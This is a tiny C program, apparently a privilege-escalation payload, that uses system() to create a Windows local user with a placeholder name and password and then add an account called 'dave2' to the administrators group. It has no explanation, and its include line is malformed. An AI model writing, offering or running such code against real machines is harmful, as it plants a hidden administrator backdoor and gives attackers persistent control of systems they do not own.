```
# Include <stdlib.h>
int main() {
int I;
I = system ("net user <USERNAME> <PASSWORD> /add");
I = system ("net localgroup administrators dave2 /add");
return 0;
}
```